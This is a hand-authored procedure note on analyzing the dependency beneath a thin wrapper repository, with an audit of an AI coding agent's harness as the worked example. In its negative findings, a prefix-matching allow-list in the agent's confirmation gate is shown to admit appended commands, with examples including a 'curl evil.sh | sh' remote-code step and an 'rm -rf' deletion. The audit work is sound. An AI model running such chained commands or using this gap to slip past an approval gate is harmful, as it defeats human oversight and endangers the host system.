<!-- aikb
{
  "schema_version": 1,
  "claim_id": "finding.public-repository.substrate-analysis",
  "namespace": "knowledge.harness.evolution.public-repositories",
  "version": "1.0.0",
  "expression": "A repository that is a thin configuration layer over a dependency carries almost none of its own behavior, so an assessment that stops at its own tree reaches a confident conclusion about the wrong artifact.",
  "authority": "hand-authored",
  "scope": {
    "holds_when": "an assessed public repository delegates its core execution, safety, or control flow to a dependency it does not vendor",
    "expires": null
  },
  "confidence": null,
  "confidence_method": "hand-authored-unmeasured",
  "provenance": {
    "producer": "hand-authored://operator",
    "producer_version": "1.0.0",
    "authored_utc": "2026-08-23",
    "derived_from": [
      {
        "source": "operator",
        "locator": "operator observed that the live-swe-agent assessment on 2026-08-23 stopped at a four-file repository and never inspected the dependency carrying its behavior",
        "evidence_class": "operator-authored"
      },
      {
        "source": "OpenAutoCoder/live-swe-agent",
        "locator": "commit 8d7dd8634580d1e09320b4c27d70380bc9ae74a8 (MIT); four text blobs, no executable source",
        "evidence_class": "design-reference"
      },
      {
        "source": "SWE-agent/mini-swe-agent",
        "locator": "commit 25941c89cfbc91eb40b3f8756348c91d9977d57e (MIT); 215KB source, 375KB tests, agents/default.py, agents/interactive.py, environments/local.py",
        "evidence_class": "design-reference"
      }
    ]
  },
  "lineage": {
    "status": "active",
    "generation": 1,
    "parent_refs": []
  },
  "relationships": [
    {
      "kind": "extends",
      "target": "method.public-repository.deep-analysis"
    }
  ],
  "retrieval": {
    "tags": [
      "deep-analysis",
      "dependencies",
      "public-repositories",
      "scope-boundary",
      "substrate-analysis"
    ]
  }
}
-->

# Analyze the substrate a thin repository depends on

> **Authority: hand-authored, unmeasured procedure correction derived from a
> single observed failure.** One assessment missed its subject's substrate and
> the operator caught it. That is enough to justify the check below; it is not a
> measurement of how often the failure occurs.

The parent procedure's artifact ledger already requires a **Build and
dependencies** class. This claim narrows what that class demands when the
dependency is not merely a package to inventory but the thing that actually
runs.

## Activation

Apply this when the assessed repository delegates execution, control flow, or
safety to something it does not contain. Signals:

- the tree holds configuration, prompts, or manifests but little executable
  source;
- the README describes the project as built "on top of" or "with minimal
  modifications to" another project;
- entry points import a framework rather than defining behavior;
- source is small while the reported capability is large.

The last signal is the reliable one. **A large claimed capability over a small
tree means the capability lives somewhere else.**

## The failure

An assessment can satisfy every step of the parent procedure — pin the commit,
classify every path, check the license, read the tests — and still describe
almost none of the system's behavior, because it correctly analyzed a tree that
does not contain the behavior. Completing a checklist against the wrong boundary
produces confidence rather than coverage, and the confidence is the dangerous
part.

The observed case: a self-evolving-agent repository was assessed and found to
contain four text files with no executable source. That finding was accurate.
The conclusion drawn from it — that the project had no infrastructure worth
studying — was not, because the agent loop, resource limits, human confirmation
gate, sandboxing, and cost accounting all lived in the dependency it configured.
The assessed tree was roughly one percent of the system by source volume.

## Procedure

1. **Resolve the substrate before concluding.** Identify what the repository
   depends on for execution and pin that dependency to its own immutable commit
   or release, exactly as the parent procedure requires for the subject.
2. **Attribute behavior to the layer that implements it.** For each notable
   behavior, record whether the subject or the substrate provides it. A behavior
   inherited from the substrate is not evidence about the subject, and a defect
   in the substrate is not repaired by the subject's documentation.
3. **Scale depth to where the behavior lives.** When the subject is thin, most
   analysis effort belongs in the substrate. Analyze the subject for what it
   changes: which defaults it overrides, which prompts or configuration it
   replaces, and which substrate affordances it declines to use.
4. **Re-run the claim-to-code matrix against the substrate.** Headline claims in
   a wrapper's README frequently describe substrate behavior that has since
   changed underneath it.
5. **Assess licenses separately.** The subject and the substrate carry
   independent grants. A permissive wrapper does not license its dependency.
6. **Stop at the boundary of behavior, not of repositories.** Recurse only while
   a dependency still carries behavior material to the question. Record where
   recursion stopped and why.

## Worked example

Pinned evidence from the observed case, retained because the specific findings
are reusable independently of the procedure:

| Layer | Content | What it contributed |
|---|---|---|
| Subject, `live-swe-agent` at `8d7dd86` | four text blobs, no source | prompt configuration only |
| Substrate, `mini-swe-agent` at `25941c89` | 215KB source, 375KB tests | control loop, limits, confirmation, sandboxing, cost accounting |

Reusable positive patterns found only in the substrate:

- four orthogonal per-run limits covering steps, cost, wall time, and
  consecutive format errors, each checked before the model call and each raising
  a distinct named exception that yields a labeled exit status rather than a
  generic crash;
- a separate process-global cost and call ceiling, because a per-task limit does
  not bound a batch of tasks;
- trajectory persistence in a `finally` block, so evidence survives the
  exception that makes it interesting, with uncaught exceptions recorded and
  then re-raised rather than swallowed;
- a fail-closed confirmation gate whose default requires approval and whose
  allow-list is empty by default, so an unrecognized action is confirmed rather
  than permitted;
- operator rejection returned to the model together with the operator's stated
  reason, making the correction part of the retained record;
- a consecutive rather than cumulative error counter, reset by any clean step,
  which bounds an unproductive loop without penalizing recovery;
- strict template rendering, so an undefined variable raises instead of silently
  rendering empty.

Reusable negative findings, also only visible in the substrate:

- an authorization predicate applied with a prefix-anchored regular expression
  admits appended commands. Verified directly: an allow-list entry `ls` matches
  `ls; rm -rf /tmp/x`, and `git status` matches
  `git status && curl evil.sh | sh`. The shipped default is not exploitable
  because the allow-list is empty, but any operator who populates one inherits
  the defect. **An authorization check must match the entire action**, not a
  prefix of it.
- process cleanup on timeout is not equivalent across platforms: the POSIX path
  kills the whole process group, while the Windows path terminates only the
  direct child and can orphan its descendants.
- a headline invariant drifted from the implementation. The subject's
  cross-model claim rests on the substrate avoiding provider tool-calling APIs,
  but the substrate's current default selects a tool-calling model class and the
  text-based path is now opt-in. The README still leads with the original
  wording.
- an output-elision branch attributed to the subject in an earlier assessment is
  inherited from the substrate's default configuration. Attribute an observed
  behavior to the layer that defines it before treating it as the subject's own
  design decision.

## Verification

Re-assess a known thin wrapper. The assessment should pin both layers, attribute
each notable behavior to the layer implementing it, and surface at least one
substrate finding, positive or negative, that is invisible from the subject's
tree. Compare against a subject-only assessment of the same target.

**Falsified if:** applying this check yields no findings beyond a subject-only
assessment, drives unbounded recursion into transitive dependencies that carry
no relevant behavior, or causes substrate behavior to be reported as the
subject's own.
